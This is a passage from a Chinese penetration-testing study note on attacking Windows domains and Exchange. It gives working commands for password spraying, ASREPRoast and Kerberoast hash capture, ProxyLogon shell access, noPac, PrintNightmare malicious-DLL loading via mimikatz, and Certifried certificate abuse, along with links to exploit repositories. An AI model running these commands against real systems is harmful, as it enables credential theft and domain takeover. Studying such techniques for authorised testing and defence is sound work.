/path/to/passwords.txt</span><br></pre></td></tr></table></figure><ul><li>ruler工具会自动搜索owa可以爆破的<a href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">接口</a></li><li><a href="https://mail.targetdomain.com/ews">ews接口</a>也存在被暴力破解利用的风险</li></ul></li><li><p>通讯录搜集</p><p>在获取一个邮箱账号密码后，可以使用<strong>MailSniper</strong>收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure></li></ol><h4 id="proxylogon"><a class="markdownIt-Anchor" href="#proxylogon"></a> proxylogon</h4><p>流程：参考<a href="https://mp.weixin.qq.com/s?__biz=MzU4NTY4MDEzMw==&amp;mid=2247493659&amp;idx=1&amp;sn=0b284ceae81206b21d21af7b46726cb1&amp;chksm=fd847c71caf3f567792145602787132ebbc7c72e9bb63369e0719a2e38043b78673f450f9e3d&amp;scene=21#wechat_redirect">链接</a></p><ol><li>通过SSRF漏洞攻击，访问Autodiscover.xml获取LegacyDN信息</li><li>在通过LegacyDN，获取SID</li><li>然后通过合法的SID，获取exchange的有效Cookie</li><li>最后通过有效的Cookie，对OABVirtualDirectory对象进行恶意操作，写入Webshell，达到控制目标的效果</li></ol><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/640.png" alt="图片" /></p><p>工具：<a href="https://github.com/Udyz/Proxylogon">https://github.com/Udyz/Proxylogon</a></p><p>利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python proxylogon.py 192.168.100.110 ruyu@test.com</span><br><span class="line">192.168.100.110 Exchange的IP</span><br><span class="line">ruyu@test.com普通域账户</span><br></pre></td></tr></table></figure><p>执行完成后，会返回一个shell，也可以自己写一个shell进去</p><h4 id="proxyshell"><a class="markdownIt-Anchor" href="#proxyshell"></a> <a href="https://cloud.tencent.com/developer/article/1876800">proxyshell</a></h4><p>ProxyShell是利用了Exchange对于路径的不准确过滤导致的路径混淆生成的SSRF，进而使攻击者通过访问PowerShell端点。而在PowerShell端点可以利用Remote PowerShell来将邮件信息打包到外部文件，而攻击者可以通过构造恶意邮件内容，利用文件写入写出webshell，从而达成命令执行。这是好几个漏洞的集合，调用链如下：</p><ol><li>CVE-2021-34473（一个ssrf漏洞）</li><li>CVE-2021-34523（Exchange PowerShell BackEnd提权）</li><li>CVE-2021-31207（认证后任意文件写入漏洞）</li></ol><p>工具：<a href="https://github.com/dmaasland/proxyshell-poc">https://github.com/dmaasland/proxyshell-poc</a></p><h4 id="privexchangecve-2019-07240686"><a class="markdownIt-Anchor" href="#privexchangecve-2019-07240686"></a> Privexchange(CVE-2019-0724/0686)</h4><p>这个漏洞的原理是利用Exchange的NTLM认证功能，通过SSRF漏洞发送特制的HTTP请求，将域控制器的NTLM哈希值发送给攻击者，然后利用这些哈希值进行传递性攻击。</p><p>利用步骤如下：</p><ol><li>攻击者通过Exchange Web服务发送一个包含自己IP地址的HTTP请求，触发SSRF漏洞。</li><li>Exchange服务器向攻击者的IP地址发送一个NTLM认证请求，包含Exchange服务器的NTLM哈希值。</li><li>攻击者回复一个特制的NTLM认证响应，包含域控制器的IP地址和一个Exchange权限的SID。</li><li>Exchange服务器向域控制器发送一个NTLM认证请求，包含域控制器的NTLM哈希值。</li><li>攻击者截获域控制器的NTLM哈希值，并利用它们进行传递性攻击，获得域管理员权限。</li></ol><p>工具：<a href="https://github.com/dirkjanm/PrivExchange.git">https://github.com/dirkjanm/PrivExchange.git</a></p><h2 id="提权"><a class="markdownIt-Anchor" href="#提权"></a> 提权</h2><h3 id="windows提权"><a class="markdownIt-Anchor" href="#windows提权"></a> Windows提权</h3><h3 id="linux提权"><a class="markdownIt-Anchor" href="#linux提权"></a> Linux提权</h3><h2 id="用户密码破解"><a class="markdownIt-Anchor" href="#用户密码破解"></a> 用户密码破解</h2><h3 id="密码喷洒固定密码爆破账户"><a class="markdownIt-Anchor" href="#密码喷洒固定密码爆破账户"></a> 密码喷洒（固定密码，爆破账户）</h3><p>密码喷洒攻击属于一种自动化攻击的方式，为了避免只针对一个用户进行密码爆破而造成账户锁定，密码喷洒攻击是对所有用户进行爆破，既避免了用户被锁定，同时也提高了用户破解密码的效率。同时，不同于固定用户名对密码进行爆破，密码喷洒攻击是<strong>固定密码对用户名进行爆破</strong>。</p><p>原理是：我们登录到域时，Kerberos会有几种返回值，分别为：用户存在/用户不存在/客户端吊销。根据这几种返回值，判断是否有用户并且登录成功。</p><p>需要注意的是，因为登录失败5次就锁定账户了，所以注意别被锁了。</p><p>工具：</p><ol><li><p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray</a>【环境：powershell 2.0】</p><p><a href="https://github.com/3gstudent/Homework-of-Powershell%E3%80%90good%E3%80%91">https://github.com/3gstudent/Homework-of-Powershell【good】</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 获取账户名</span><br><span class="line">Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt</span><br><span class="line"># 单个密码喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -Password Spring2017</span><br><span class="line"># 多个密码/用户喷洒</span><br><span class="line">Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt</span><br></pre></td></tr></table></figure></li><li><p><a href="https://codeload.github.com/3gstudent/pyKerbrute">https://codeload.github.com/3gstudent/pyKerbrute</a></p></li><li><p><a href="https://github.com/shack2/SNETCracker%EF%BC%8C%E9%99%A4%E4%BA%86%E4%B8%8A%E8%BF%B0%E7%9A%84%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%EF%BC%8C%E8%BF%98%E6%9C%89%E5%85%B6%E4%BB%96%E5%BA%94%E7%94%A8%E7%9A%84%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92%EF%BC%8C%E4%BE%8B%E5%A6%82mysql%E7%AD%89%E7%AD%89">https://github.com/shack2/SNETCracker，除了上述的密码喷洒，还有其他应用的密码喷洒，例如mysql等等</a></p></li><li><p><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.12 -u users.txt -p &#x27;admin!@#45&#x27; --continue-on-success</span><br></pre></td></tr></table></figure></li><li><p>Hydra</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -p admin!@#45 10.10.10.12 smb</span><br></pre></td></tr></table></figure></li><li><p>MSF的<code>scanner/smb/smb_login</code>模块</p></li></ol><p>注意了，这些都是需要搭建代理/隧道的</p><p>检测手段：<a href="https://zhuanlan.zhihu.com/p/37427514">https://zhuanlan.zhihu.com/p/37427514</a></p><p>参考：<a href="https://www.freebuf.com/articles/web/291782.html">https://www.freebuf.com/articles/web/291782.html</a></p><h3 id="asreproast"><a class="markdownIt-Anchor" href="#asreproast"></a> ASREPRoast</h3><p>ASREPRoast是一种对用户账号进行离线爆破的攻击方式，它利用了Kerberos协议中的一个特性：预身份认证。</p><blockquote><p>Kerberos预身份验证是Kerberos身份验证的第一步，它的主要作用是防止密码脱机爆破预身份验证。默认情况下，预身份验证是开启的，域控会记录密码错误次数，防止在线爆破。如果用户账号没有开启预身份验证，域控不会作任何验证就将TGT票据和该用户Hash加密的Session Key返回</p></blockquote><p>利用过程大致如下：</p><ol><li><p>攻击者查找目标域中<strong>没有开启Kerberos预身份验证</strong>的用户，可以使用工具（例如PowerView、CrackMapExec等）进行枚举。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PowerView&gt; Get-DomainUser -PreauthNotRequired -Verbose</span><br><span class="line">crackmapexec&gt; crackmapexec smb 10.10.10.10 --kerberos -u Administrator -H 00000000000000000000000000000000</span><br></pre></td></tr></table></figure></li><li><p>攻击者向域控制器发送AS_REQ请求，代表这些用户，获取AS_REP响应。这些响应中包含了用用户密码加密的数据块。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py &lt;domain&gt;/ -usersfile &lt;username.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;</span><br><span class="line">Rubeus.exe asreproast /format:hashcat</span><br></pre></td></tr></table></figure></li><li><p>攻击者将这些数据块保存为hash文件，使用工具（例如hashcat、john等）进行离线爆破，获取用户密码</p></li></ol><h3 id="kerberoast"><a class="markdownIt-Anchor" href="#kerberoast"></a> Kerberoast</h3><p>Kerberoasting的攻击方式，它的目的是获取服务账号的密码哈希，破解然后重写。</p><p>这些票据可以通过考虑多种因素来识别，例如：</p><blockquote><p>SPNs绑定到域用户账户</p><p>最后一次密码设置（Password last set）</p><p>密码过期时间</p><p>最后一次登录（Last logon）</p></blockquote><p>具体来说，Kerberoast攻击涉及以下五个步骤：</p><blockquote><p><a href="http://www.freebuf.com/system/174229.html?preview=true">服务主体名称（SPN）发现</a></p><p>请求服务票据</p><p>导出服务票据</p><p>破解服务票据</p><p>重写服务票据&amp;RAM注入</p></blockquote><p>具体步骤如下：</p><ol><li><p>攻击者用LDAP查询域内的spn，spn是服务主体名称，用于标识提供服务的账号和主机</p><p><strong>使用ldap查询spn有多种方法</strong></p><ol><li><p>使用PowerShell的<code>Get-ADUser</code> cmdlet，可以指定<code>servicePrincipalName</code>作为过滤条件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell&gt; Get-ADUser -Filter &#123;ServicePrincipalName -like &quot;*&quot;&#125; -Properties ServicePrincipalName</span><br></pre></td></tr></table></figure></li><li><p>使用ldapsearch工具，可以指定servicePrincipalName作为搜索属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -h dc1.contoso.com -b &quot;dc=contoso,dc=com&quot; &quot;(servicePrincipalName=*)&quot; servicePrincipalName</span><br></pre></td></tr></table></figure></li><li><p>使用impacket</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py -request -dc-ip 10.10.10.10 contoso.com/Administrator:Password</span><br></pre></td></tr></table></figure></li><li><p>使用psexec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -k -no-pass contoso.com/Administrator@10.10.10.10</span><br></pre></td></tr></table></figure></li><li><p>直接使用powershell自带指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T domain -q */* // 查看当前域内所有的 SPN</span><br></pre></td></tr></table></figure></li></ol></li><li><p>攻击者向域控发送TGS包，TGS是票据授予服务，用于请求访问服务的票据。域控会返回一个TGS票据，其中包含了用服务账号密码哈希加密的数据</p><p>破解哈希值可以用：</p><ol><li><p>使用Rubeus：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /spn:MSSQLSvc/dc1.contoso.com /outfile:hash.txt</span><br></pre></td></tr></table></figure></li></ol></li><li><p>攻击者将这些数据保存为hash文件，使用工具（例如hashcat）进行离线爆破，获取服务账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TGSrepcrack.py</span><br></pre></td></tr></table></figure></li><li><p>注入可以使用mimikatz</p></li></ol><p>这一套下来可以使用工具：<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a></p><p>参考：<a href="https://www.freebuf.com/articles/web/291783.html">https://www.freebuf.com/articles/web/291783.html</a></p><h3 id="blind-kerberoasting"><a class="markdownIt-Anchor" href="#blind-kerberoasting"></a> Blind Kerberoasting</h3><h3 id="cve-2022-33679-kerberos提权漏洞"><a class="markdownIt-Anchor" href="#cve-2022-33679-kerberos提权漏洞"></a> CVE-2022-33679 Kerberos提权漏洞</h3><p><strong>利用条件：需要设置“不需要 Kerberos 预身份验证”用户帐户控制标志，并配置了 RC4 密钥，比较苛刻</strong></p><p>攻击流程：</p><ol><li>攻击者发送一个没有预授权的 AS-REQ 请求 RC4-MD4 密钥加密。如果用户不需要预授权，KDC 将发回一个 AS-REP，其中包含使用 RC4-MD4 加密的会话密钥等。</li><li>根据加密数据的长度，计算出加密密钥开始前的0x15字节，只要总长度就可以猜到。可能需要发送适当长的主机地址来填充 ASN1 编码数据，以便将密钥对齐到合适的位置。</li><li>根据计算出的ASN1数据和加密后的KDC-REP生成密钥流的前0x2D字节（密文中前0x18字节全为0）。</li><li>使用密钥流加密 PA-ENC-TIMESTAMP 预认证缓冲区，如果仅使用 KerberosTime，则大小将恰好为 0x15 字节，即带有初始填充的 0x2D。</li><li>在新的 AS-REQ 中发送加密的时间戳以验证密钥流是否正确。</li></ol><h2 id="相关知识点-2"><a class="markdownIt-Anchor" href="#相关知识点-2"></a> 相关知识点</h2><h3 id="sysvol"><a class="markdownIt-Anchor" href="#sysvol"></a> SYSVOL</h3><h1 id="凭证-令牌和哈希信息的利用"><a class="markdownIt-Anchor" href="#凭证-令牌和哈希信息的利用"></a> 凭证、令牌和哈希信息的利用</h1><h2 id="凭证令牌抓取本地管理员权限"><a class="markdownIt-Anchor" href="#凭证令牌抓取本地管理员权限"></a> 凭证/令牌抓取【本地管理员权限】</h2><h2 id="哈希破解"><a class="markdownIt-Anchor" href="#哈希破解"></a> 哈希破解</h2><h2 id="模拟凭证访问服务"><a class="markdownIt-Anchor" href="#模拟凭证访问服务"></a> 模拟凭证，访问服务</h2><h1 id="横向移动"><a class="markdownIt-Anchor" href="#横向移动"></a> 横向移动</h1><h2 id="查看是否出网"><a class="markdownIt-Anchor" href="#查看是否出网"></a> 查看是否出网</h2><p>可以用以下命令判断:</p><blockquote><p>ping : icmp</p><p>curl : http</p><p>nslookup : dns</p></blockquote><h2 id="laps"><a class="markdownIt-Anchor" href="#laps"></a> LAPS</h2><p>本地管理员密码解决方案 (LAPS) 是一种通过域管理本地管理员帐户密码的方法。如果没有圈数，支持团队很难管理为每个系统保留唯一的本地管理员密码。这会导致共享凭据，这意味着当攻击者在系统上获得提升的权限时，他们可以转储共享凭据并使用它来访问其他系统。</p><p>攻击的前提是：已获得域内成员的凭据</p><h1 id="获取域控"><a class="markdownIt-Anchor" href="#获取域控"></a> 获取域控</h1><h2 id="ms14-068"><a class="markdownIt-Anchor" href="#ms14-068"></a> MS14-068</h2><p>此漏洞用于制作金票据和银票据。</p><p>MS14-068是一个<strong>Windows Kerberos 特权提升漏洞</strong>，它可以让攻击者伪造域控管理员的TGT和ST，获取域内任意用户的权限。利用这个漏洞的条件是<strong>域控没有打MS14-068的补丁(KB3011780)</strong>，并且攻击者<strong>拿下一台加入域的计算机</strong>，同时知道<strong>任意域用户名、SID、密码</strong>。利用这个漏洞的方法是使用工具如ms14-068.exe或者PyKEY生成伪造的TGT和ST，然后使用mimikatz.exe将证书写入内存。</p><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><ol><li><p>信息搜集：</p><ol><li><p>获取域用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; net user /domain</span><br><span class="line">bunny</span><br></pre></td></tr></table></figure></li><li><p>获取sid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; whoami /user</span><br><span class="line">whoamianony\bunny S-1-5-21-1315137663-3706837544-1429009142-1112</span><br></pre></td></tr></table></figure></li><li><p>获取域控名和域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; net time /domain</span><br><span class="line">\\DC.whoamianony.org 的当前时间是 2023/7/17 14:13:04</span><br></pre></td></tr></table></figure></li><li><p>获取域控IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; ping DC.whoamianony.org</span><br><span class="line">正在 Ping dc.whoamianony.org [192.168.93.30] 具有 32 字节的数据:</span><br></pre></td></tr></table></figure></li></ol></li><li><p>清空凭证</p></li><li><p>制作金票据</p></li></ol><h3 id="金银票据的区别"><a class="markdownIt-Anchor" href="#金银票据的区别"></a> 金银票据的区别</h3><p><img src="/images/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E8%A1%A5%E5%85%85%E7%89%88/image-20230629111115012.png" alt="image-20230629111115012" /></p><ol><li><p>访问权限不同：</p><ul><li>Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li><li>Silver Ticket：伪造TGS（也就是ST），只能访问指定的服务</li></ul></li><li><p>加密方式不同：</p><ul><li><p>Golden Ticket由Kerberos的Hash加密</p></li><li><p>Silver Ticket由服务账号（通常为计算机账户）</p></li></ul></li><li><p>Hash加密认证流程不同：</p><ul><li>Golden Ticket的利用过程需要访问域控</li><li>Silver Ticket不需要访问域控</li></ul></li><li><p>伪造跳跃的步骤不同</p><p>黄金票据是伪造TGT，在kerberos认证中忽略前两步，白银票据就是直接伪造ST</p></li></ol><h2 id="privexchangecve-2019-07240686-2"><a class="markdownIt-Anchor" href="#privexchangecve-2019-07240686-2"></a> Privexchange(CVE-2019-0724/0686)</h2><p>这个漏洞的原理是利用Exchange的NTLM认证功能，通过SSRF漏洞发送特制的HTTP请求，将域控制器的NTLM哈希值发送给攻击者，然后利用这些哈希值进行传递性攻击。</p><p>利用步骤如下：</p><ol><li>攻击者通过Exchange Web服务发送一个包含自己IP地址的HTTP请求，触发SSRF漏洞。</li><li>Exchange服务器向攻击者的IP地址发送一个NTLM认证请求，包含Exchange服务器的NTLM哈希值。</li><li>攻击者回复一个特制的NTLM认证响应，包含域控制器的IP地址和一个Exchange权限的SID。</li><li>Exchange服务器向域控制器发送一个NTLM认证请求，包含域控制器的NTLM哈希值。</li><li>攻击者截获域控制器的NTLM哈希值，并利用它们进行传递性攻击，获得域管理员权限。</li></ol><p>工具：<a href="https://github.com/dirkjanm/PrivExchange.git">https://github.com/dirkjanm/PrivExchange.git</a></p><h2 id="nopacsamaccountnamecve-2021-4228742278"><a class="markdownIt-Anchor" href="#nopacsamaccountnamecve-2021-4228742278"></a> NoPAC/SamAccountName(CVE-2021-42287/42278)</h2><p>NoPac/SamAccountName漏洞是指两个Active Directory相关的漏洞的组合利用，分别是<strong>CVE-2021-42278</strong>和<strong>CVE-2021-42287</strong>。这两个漏洞都与sAMAccountName属性有关，该属性是域用户的唯一标识符。</p><ul><li><p>CVE-2021-42278漏洞，它允许一个攻击者使用一个ST，向域控发起S4U2Proxy请求TGS，并利用该TGS伪造任意用户的身份；允许攻击者通过修改自己的sAMAccountName为域控的计算机名，欺骗域控认为自己是域控。</p></li><li><p>CVE-2021-42287漏洞，它允许一个攻击者使用创建的计算机账户获取到的TGT，向域控发起S4U2Self请求ST，并利用该ST进行横向移动和权限提升；允许攻击者通过在sAMAccountName后面加上<code>$</code>符号，绕过域控的安全检查，获取域控的权限。</p></li><li><p>利用这两个漏洞的关键点是，域控在处理S4U2Self和S4U2Proxy请求时，会根据ST中的SamAccountName字段来判断用户的身份，而不是根据PAC（Privilege Attribute Certificate）字段，而这个字段是可以被攻击者修改的</p></li></ul><h3 id="利用流程"><a class="markdownIt-Anchor" href="#利用流程"></a> 利用流程</h3><ol><li>创建一个计算机账户，并获取其TGT。</li><li>使用该TGT向域控发起S4U2Self请求ST，并修改ST中的SamAccountName字段为目标用户（如域管）。42287</li><li>使用该ST向域控发起S4U2Proxy请求TGS，并修改TGS中的SamAccountName字段为目标用户。42278</li><li>使用该TGS访问目标用户可以访问的服务（如域控），并执行任意命令</li></ol><h3 id="适用工具"><a class="markdownIt-Anchor" href="#适用工具"></a> 适用工具</h3><ul><li><p><a href="https://github.com/cube0x0/noPac">nopac CVE-2021-42287/CVE-2021-42278 Scanner &amp; Exploiter</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./noPac.exe -domain dc.com -user username -pass &#x27;password&#x27; /dc owa.dc.com</span><br><span class="line">/mAccount mAusername /mPassword password /service cifs /ptt</span><br></pre></td></tr></table></figure></li><li><p><a href="https://github.com/WazeHell/sam-the-admin">冒充域用户</a></p></li><li><p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></p></li><li><p>mimikatz</p></li></ul><p>参考：</p><ol><li><a href="https://trya9ain.github.io/posts/nopac-%E5%88%86%E6%9E%90/">https://trya9ain.github.io/posts/nopac-分析/</a></li><li><a href="https://xz.aliyun.com/t/12138">https://xz.aliyun.com/t/12138</a></li><li><a href="https://www.freebuf.com/vuls/317773.html">https://www.freebuf.com/vuls/317773.html</a></li></ol><h3 id="相关解释"><a class="markdownIt-Anchor" href="#相关解释"></a> 相关解释</h3><p>在域中每一个用户即是一个对象,，每个对象都具有各种各样的属性，而每个域用户的用户名对应的属性值便为 userPrincipalName 和 sAMAccountName，他们因为之前版本遗留问题，都可以作为用户名用来登录到域。</p><p>为了区分用户帐户和计算机帐户，计算机帐户应在其 sAMAccountName 属性中以<code>$</code>结尾，但 Active Directory 并未对计算机帐户 sAMAccountName 属性进行验证，每个普通用户最多创建10个计算机用户作为其所有者，可以更改其sAMAccountName 属性。[42278]</p><blockquote><p>域用户：abc</p><p>计算机用户：winr2$</p></blockquote><p>而为了欺骗 KDC，认为我们的账户是DC账户，我们更改一个计算机用户为：<code>DC$</code>。当Kerberos进行身份认证时，会从密钥分发中心请求TGT和ST，如果为无法找到的帐户请求 ST，KDC 将尝在其 sAMAccountName 结尾添加 <code>$ </code>再次搜索，而如果再找不到，KDC会继续查找altSecurityIdentities属性的值的用户。所以，可以向域控发起S4U2Self请求ST，KDC 将使用<code>DC$</code>的权限签发 ST，我们则利用之进行下一步攻击。[42287]</p><p>过程中涉及到的概念如下：</p><ul><li>TGT（Ticket Granting Ticket）是一个由KDC（Key Distribution Center）颁发的票据，用于证明用户的身份，并用于获取访问其他服务的ST（Service Ticket）</li><li>S4U2Self（Server for User to Self）是一个Kerberos协议的扩展，允许一个服务代表一个用户获取一个访问自身的ST，而不需要用户提供Kerberos凭据</li><li>CVE-2021-42287是一个Kerberos协议的漏洞，它允许一个攻击者使用创建的计算机账户获取到的TGT，向域控发起S4U2Self请求ST，并利用该ST进行横向移动和权限提升。</li></ul><ul><li><p>PAC (Privilege Attribute Certificate, 特权属性证书)，其中所包含的是各种授权信息，PAC 用来表示用户的权限，如果没有 PAC, Kerberos 协议就仅能证明用户身份，无法表示用户权限。</p><p>注：TGT 和 ST 中的 authorization-data 字段里的内容就是 PAC。</p></li></ul><h2 id="printnightmarecve-2021-167534527"><a class="markdownIt-Anchor" href="#printnightmarecve-2021-167534527"></a> PrintNightmare(CVE-2021-1675/34527)</h2><p>在所有基于 Windows 的系统中，包括域控制器和具有系统管理员权限的计算机，都会在默认条件下开启 Windows 打印后台处理程序，使机器更容易受到攻击。而PrintNightmare是指一种影响Windows打印服务的漏洞，它可以让攻击者利用恶意DLL实现远程代码执行或本地权限提升。PrintNightmare实际上包含两个漏洞：</p><ul><li>CVE-2021-1675：这个漏洞最初被认为是一个本地权限提升漏洞，但后来发现也可以被远程利用。它允许攻击者通过AddPrinterDriverEx函数加载恶意DLL，并以SYSTEM权限执行任意代码</li><li>CVE-2021-34527：这个漏洞是对CVE-2021-1675补丁的绕过，它允许攻击者通过RpcAsyncAddPrinterDriver函数加载恶意DLL，并以SYSTEM权限执行任意代码</li></ul><p>这两个漏洞的共同点是，它们都利用了Windows打印服务中的一个逻辑错误，<strong>即在加载DLL时没有对其路径进行安全检查，导致攻击者可以指定任意位置的DLL</strong>。</p><h3 id="基本步骤"><a class="markdownIt-Anchor" href="#基本步骤"></a> 基本步骤</h3><ol><li><p>在一个可访问的SMB共享上放置一个恶意DLL文件（SMB允许匿名访问，即目标可以直接获取到文件）</p><blockquote><p>WIN上可以使用一些脚本，例如**<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">三好学生的测试脚本</a>**，而Linux上需要安装SMB服务以开启。</p></blockquote></li><li><p>使用一个利用工具，如mimikatz或Impacket，向目标Windows系统发送一个RPC请求，指定恶意DLL的路径</p><blockquote><p>这个恶意DLL可以是由CS或者MSF生成的。发送RPC请求的指令可以为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># rpc::connect /remote:192.168.0.224 /authuser:m3g9tr0n /authdomain:hacklab.local /authpassword:Super_SecretPass!</span></span><br><span class="line">mimikatz <span class="comment"># rpc::addprinterdriver /server:target /driver:drivername /path:\\smb\share\malicious.dll</span></span><br><span class="line"></span><br><span class="line">rpcdump.py hacklab.local/m3g9tr0n:Super_SecretPass!@<span class="number">192.168</span>.<span class="number">0.224</span></span><br><span class="line">psexec.py hacklab.local/m3g9tr0n:Super_SecretPass!@<span class="number">192.168</span>.<span class="number">0.224</span> <span class="string">&#x27;\\smb\share\malicious.dll&#x27;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>如果目标系统没有安装补丁，打印服务会加载并执行恶意DLL，从而实现远程代码执行或本地权限提升</p><p>使用exp就好啦~</p></li></ol><h3 id="解决工具"><a class="markdownIt-Anchor" href="#解决工具"></a> 解决工具</h3><ol><li>EXP：<a href="https://github.com/outflanknl/PrintNightmare">https://github.com/outflanknl/PrintNightmare</a></li><li>EXP2：<a href="https://github.com/tothi/CVE-2021-1675.git">https://github.com/tothi/CVE-2021-1675.git</a></li><li>SMB开启：<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></li></ol><h2 id="certifriedcve-2022-26923need-adcs"><a class="markdownIt-Anchor" href="#certifriedcve-2022-26923need-adcs"></a> Certifried(CVE-2022-26923)[NEED ADCS]</h2><p>Certifried (CVE-2022-26923) 是一个在Active Directory证书服务（AD CS）上发现的漏洞，它可以让一个域内的普通用户提升自己在域中的权限。这个漏洞的原理是，一个域用户创建一个计算机账户时，会获得<strong>验证写入DNS主机名</strong>和<strong>验证写入服务主体名</strong>的权限（以及其他一些权利）。这些权限可以让用户修改计算机账户的dNSHostName属性，<strong>使其与域控制器的属性相同</strong>，然后从AD CS中获取域控制器的证书，从而实现域内的权限提升。</p><blockquote><p>这个跟noPAC的描述有点像，都是修改属性，模拟成域控，从而达到提权。</p></blockquote><p>利用这个漏洞的方法有以下几个步骤：（参考：<a href="https://tryhackme.com/room/cve202226923#%EF%BC%89">https://tryhackme.com/room/cve202226923#）</a></p><ul><li><p>创建一个计算机账户，并修改其dNSHostName属性为域控制器的属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Impacket&gt; addcomputer.py &#x27;lunar.eruca.com/thm:Password1@&#x27; -method LDAPS -computer-name &#x27;THMPC&#x27; -computer-pass &#x27;Password1@&#x27;</span><br><span class="line">或者</span><br><span class="line">certipy account create -u &lt;user&gt;@&lt;domain&gt; -p &#x27;&lt;password&gt;&#x27; -user &#x27;certifriedpc&#x27; -pass &#x27;certifriedpcpass&#x27; -dns &#x27;&lt;fqdn_dc&gt;&#x27;</span><br></pre></td></tr></table></figure></li><li><p>为该计算机账户生成一个证书请求，并提交给AD CS。</p><p>使用<a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 生成证书</span><br><span class="line">certipy req -username thm@lunar.eruca.com -password Password1@ -ca LUNAR-LUNDC-CA -target lundc.lunar.eruca.com -template User</span><br><span class="line"></span><br><span class="line">-u username@domain, -username username@domain</span><br><span class="line">-p password, -password password</span><br><span class="line">-ca certificate authority name</span><br><span class="line">-target dns/ip address</span><br><span class="line">-template template name</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">certipy req -u 